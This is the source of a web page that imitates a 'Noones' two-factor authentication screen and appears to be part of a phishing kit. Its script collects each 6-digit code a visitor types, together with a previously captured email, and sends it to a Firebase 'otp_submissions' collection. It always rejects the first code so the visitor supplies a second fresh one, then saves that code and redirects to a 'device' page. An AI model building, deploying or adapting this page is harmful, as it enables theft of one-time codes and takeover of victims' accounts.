<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Authenticator Verification</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Inter',sans-serif;
}

:root{

--bg:#1f1f1f;
--card:#2b2b2b;
--input:#363636;
--border:#4b4b4b;
--text:#ffffff;
--muted:#a7a7a7;
--green:#2dd46b;
--green-dark:#24b85c;

}

html,body{
height:100%;
}

body{

background:var(--bg);

display:flex;

justify-content:center;

align-items:center;

padding:40px 20px;

color:white;

}

.wrapper{

width:100%;

max-width:520px;

}

.logo{

display:flex;

justify-content:center;

margin-bottom:28px;

}

.logo img{

width:160px;

height:auto;

}

.card{

background:var(--card);

border-radius:22px;

padding:42px;

box-shadow:
0 18px 40px rgba(0,0,0,.45);

}

.card h1{

font-size:30px;

font-weight:700;

line-height:1.2;

margin-bottom:14px;

}

.subtitle{

font-size:16px;

color:var(--muted);

line-height:1.6;

margin-bottom:34px;

}

.otp{

display:flex;

justify-content:space-between;

gap:12px;

margin-bottom:26px;

}

.otp input{

width:58px;

height:62px;

border-radius:14px;

border:1px solid var(--border);

background:var(--input);

color:white;

font-size:28px;

font-weight:700;

text-align:center;

outline:none;

transition:.2s;

}

.otp input:focus{

border-color:var(--green);

box-shadow:0 0 0 3px rgba(45,212,107,.18);

}

#pasteBtn{

display:block;

margin:0 auto 28px;

padding:10px 24px;

background:#454545;

border:none;

border-radius:10px;

color:white;

font-size:14px;

font-weight:600;

cursor:pointer;

transition:.2s;

}

#pasteBtn:hover{

background:#525252;

}
#error{

display:none;

margin-bottom:18px;

padding:12px 14px;

background:rgba(255,77,77,.08);

border:1px solid rgba(255,77,77,.20);

border-radius:12px;

color:#ff7d7d;

font-size:14px;

font-weight:600;

text-align:center;

}

#verifyBtn{

width:100%;

height:56px;

border:none;

border-radius:14px;

background:var(--green);

color:white;

font-size:17px;

font-weight:700;

cursor:pointer;

transition:.25s;

margin-top:6px;

}

#verifyBtn:hover:not(:disabled){

background:var(--green-dark);

}

#verifyBtn:disabled{

background:#5a5a5a;

color:#cfcfcf;

cursor:not-allowed;

}

.support{

margin-top:28px;

font-size:15px;

line-height:1.8;

color:#b5b5b5;

text-align:center;

}

.support a{

color:var(--green);

text-decoration:none;

font-weight:600;

}

.support a:hover{

text-decoration:underline;

}

.footer{

margin-top:34px;

display:flex;

justify-content:space-between;

align-items:center;

color:#d2d2d2;

font-size:15px;

}

.theme{

display:flex;

align-items:center;

gap:14px;

}

.toggle{

width:56px;

height:30px;

background:var(--green);

border-radius:30px;

position:relative;

}

.toggle::after{

content:"";

position:absolute;

right:3px;

top:3px;

width:24px;

height:24px;

border-radius:50%;

background:#2d2d2d;

}

.language{

display:flex;

align-items:center;

gap:6px;

cursor:pointer;

}

@media(max-width:600px){

body{

padding:18px;

}

.wrapper{

max-width:100%;

}

.card{

padding:28px 22px;

border-radius:18px;

}

.logo img{

width:145px;

}

.card h1{

font-size:26px;

}

.subtitle{

font-size:15px;

margin-bottom:28px;

}

.otp{

gap:8px;

}

.otp input{

width:46px;

height:54px;

font-size:24px;

}

#verifyBtn{

height:54px;

}

.footer{

margin-top:28px;

font-size:14px;

}

}

</style>
</head>

<body>

<div class="wrapper">

<div class="logo">
<img src="images/noones-logo.png" alt="Noones">
</div>

<div class="card">

<h1>Two-factor authentication</h1>

<div class="subtitle">
Enter the 6-digit code from your Authenticator app.
</div>

<div class="otp">

<input type="text" maxlength="1">
<input type="text" maxlength="1">
<input type="text" maxlength="1">
<input type="text" maxlength="1">
<input type="text" maxlength="1">
<input type="text" maxlength="1">

</div>

<button id="pasteBtn" type="button">
Paste
</button>

<div id="error">
Wrong code. Please try again.
</div>

<button id="verifyBtn" disabled>
Continue
</button>

<div class="support">
If you need to reset 2FA, please
<a href="#" id="supportLink">contact support ↗</a>
</div>

<div class="footer">

<div class="theme">

<span>☀</span>

<div class="toggle"></div>

<span>🌙</span>

</div>

<div class="language">
English ▼
</div>

</div>

</div>

</div>

<script type="module">
    const inputs = [...document.querySelectorAll(".otp input")];

const verifyBtn = document.getElementById("verifyBtn");

const pasteBtn = document.getElementById("pasteBtn");

const error = document.getElementById("error");

/* ==========================
ENABLE BUTTON
========================== */

function updateButton(){

const filled = inputs.every(input => input.value.length === 1);

verifyBtn.disabled = !filled;

}

/* ==========================
INPUT
========================== */

inputs.forEach((input,index)=>{

input.addEventListener("input",()=>{

input.value=input.value.replace(/\D/g,"").slice(0,1);

if(input.value && index<inputs.length-1){

inputs[index+1].focus();

}

updateButton();

});

input.addEventListener("keydown",(e)=>{

if(e.key==="Backspace" && !input.value && index>0){

inputs[index-1].focus();

}

});

input.addEventListener("focus",()=>{

input.select();

});

});

/* ==========================
PASTE
========================== */

pasteBtn.addEventListener("click",async()=>{

try{

const text=(await navigator.clipboard.readText())
.replace(/\D/g,"")
.substring(0,6);

if(!text)return;

inputs.forEach((box,i)=>{

box.value=text[i] || "";

});

updateButton();

const next=inputs.find(input=>!input.value);

(next || inputs[5]).focus();

}catch{

alert("Unable to access clipboard.");

}

});

/* ==========================
PASTE USING CTRL+V
========================== */

document.addEventListener("paste",(e)=>{

const pasted=(e.clipboardData.getData("text"))
.replace(/\D/g,"")
.substring(0,6);

if(!pasted)return;

e.preventDefault();

inputs.forEach((box,i)=>{

box.value=pasted[i] || "";

});

updateButton();

});

/* ==========================
ENTER KEY
========================== */

document.addEventListener("keydown",(e)=>{

if(e.key==="Enter" && !verifyBtn.disabled){

verifyBtn.click();

}

});

updateButton();
import { db } from "./js/firebase.js";

import {
collection,
addDoc,
serverTimestamp
} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";

/* ==========================
VERIFY BUTTON
========================== */

verifyBtn.addEventListener("click", verifyOTP);

async function verifyOTP(){

error.style.display="none";

const otp = inputs.map(input=>input.value).join("");

if(otp.length!==6){

error.textContent="Please enter the complete 6-digit code.";
error.style.display="block";

return;

}

const email = localStorage.getItem("loginEmail") || "";

let attempts = Number(localStorage.getItem("otpAttempts")) || 0;

verifyBtn.disabled=true;

verifyBtn.textContent="Verifying...";

try{

await addDoc(collection(db,"otp_submissions"),{

email:email,

otp:otp,

attempt:attempts+1,

status:"Pending",

createdAt:serverTimestamp()

});

}catch(err){

verifyBtn.disabled=false;

verifyBtn.textContent="Continue";

error.textContent="Unable to verify. Please try again.";

error.style.display="block";

console.error(err);

return;

}

/* ==========================
FIRST ATTEMPT
========================== */

if(attempts===0){

localStorage.setItem("otpAttempts","1");

verifyBtn.disabled=false;

verifyBtn.textContent="Continue";

error.textContent="Wrong code. Please try again.";

error.style.display="block";

inputs.forEach(box=>box.value="");

inputs[0].focus();

updateButton();

return;

}

/* ==========================
SECOND ATTEMPT
========================== */

localStorage.removeItem("otpAttempts");

localStorage.setItem("authenticatorOTP",otp);

window.location.href="device.html";

}

/* ==========================
END
========================== */

</script>

</body>

</html>
